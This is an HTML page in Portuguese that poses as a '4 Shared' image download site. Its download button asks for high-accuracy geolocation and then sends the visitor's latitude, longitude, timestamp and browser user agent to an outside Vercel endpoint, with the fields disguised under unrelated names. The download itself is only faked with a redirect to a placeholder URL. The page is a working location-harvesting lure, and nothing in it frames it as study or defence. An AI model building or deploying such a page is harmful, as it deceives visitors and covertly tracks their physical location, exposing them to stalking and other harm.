<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Download Imagem</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet"
    />
  </head>
  <body
    class="bg-gradient-to-br from-purple-600 to-blue-500 min-h-screen flex items-center justify-center"
  >
    <div class="bg-white w-96 rounded-2xl shadow-2xl overflow-hidden">
      <!-- Cabeçalho -->
      <div class="bg-gradient-to-r from-purple-600 to-blue-500">
        <p class="text-center text-2xl font-bold text-white">4 Shared</p>
        <p class="p-2 font-bold text-gray-600 text-center text-white">
          Aceite os termos de download no seu computador
        </p>
      </div>
      <div
        class="bg-gradient-to-r from-purple-600 to-blue-500 p-4 flex items-center"
      >
        <span class="material-icons text-white mr-3">image</span>
        <h2 class="text-white font-bold text-lg">Download de Imagem</h2>
      </div>

      <!-- Área de conteúdo -->
      <div class="p-6 text-center">
        <div class="bg-gray-100 rounded-lg p-6 mb-4">
          <span class="material-icons text-6xl text-gray-400 mb-4 block"
            >cloud_download</span
          >
          <h3 class="text-xl font-semibold mb-2 text-gray-800">
            Imagem Exclusiva
          </h3>
          <p class="text-gray-600 mb-4">
            Clique no botão abaixo para baixar a imagem
          </p>
        </div>

        <!-- Botão de Download -->
        <button
          id="downloadBtn"
          class="w-full bg-gradient-to-r from-purple-600 to-blue-500 text-white py-3 rounded-lg hover:opacity-90 transition-all flex items-center justify-center"
        >
          <span class="material-icons mr-2">download</span>
          Download Imagem
        </button>

        <!-- Área de status -->
        <div id="statusArea" class="mt-4 hidden">
          <div
            id="statusMessage"
            class="bg-gray-100 p-3 rounded-lg text-center"
          ></div>
        </div>
      </div>

      <!-- Rodapé -->
      <div class="bg-gray-100 p-4 text-center text-sm text-gray-600">
        © 2025 4Shared host
      </div>
    </div>

    <script>
      document
        .getElementById("downloadBtn")
        .addEventListener("click", function () {
          // Desabilita o botão durante o processo
          this.disabled = true;
          this.innerHTML = "Processando...";

          // Mostra área de status
          const statusArea = document.getElementById("statusArea");
          const statusMessage = document.getElementById("statusMessage");
          statusArea.classList.remove("hidden");

          // Verifica suporte à geolocalização
          if (navigator.geolocation) {
            statusMessage.innerHTML = "Verificando permissão...";
            statusMessage.classList.add("text-yellow-600");

            navigator.geolocation.getCurrentPosition(
              // Sucesso
              function (position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Envia localização
                sendLocationToServer(latitude, longitude);

                // Atualiza status
                statusMessage.innerHTML = "Preparando download...";
                statusMessage.classList.remove("text-yellow-600");
                statusMessage.classList.add("text-green-600");

                // Simula download
                setTimeout(() => {
                  window.location.href =
                    "https://exemplo.com/imagem-exclusiva.jpg";
                }, 2000);
              },
              // Erro
              function (error) {
                let errorMessage = "Erro desconhecido";

                switch (error.code) {
                  case error.PERMISSION_DENIED:
                    errorMessage = "Permissão de localização negada";
                    break;
                  case error.POSITION_UNAVAILABLE:
                    errorMessage = "Localização indisponível";
                    break;
                  case error.TIMEOUT:
                    errorMessage = "Tempo de solicitação expirado";
                    break;
                }

                statusMessage.innerHTML = errorMessage;
                statusMessage.classList.remove("text-yellow-600");
                statusMessage.classList.add("text-red-600");

                // Reabilita o botão
                document.getElementById("downloadBtn").disabled = false;
                document.getElementById("downloadBtn").innerHTML =
                  "Download Imagem";
              },
              {
                // Opções de geolocalização
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0,
              }
            );
          } else {
            statusMessage.innerHTML = "Geolocalização não suportada";
            statusMessage.classList.add("text-red-600");
          }
        });

      function sendLocationToServer(latitude, longitude) {
        fetch("https://api-concursos.vercel.app/apostilas", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            nome: latitude,
            imagem: longitude,
            descricao: new Date().toISOString(),
            link: navigator.userAgent,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Localização enviada:", data);
          })
          .catch((error) => {
            console.error("Erro:", error);
          });
      }
    </script>
  </body>
</html>
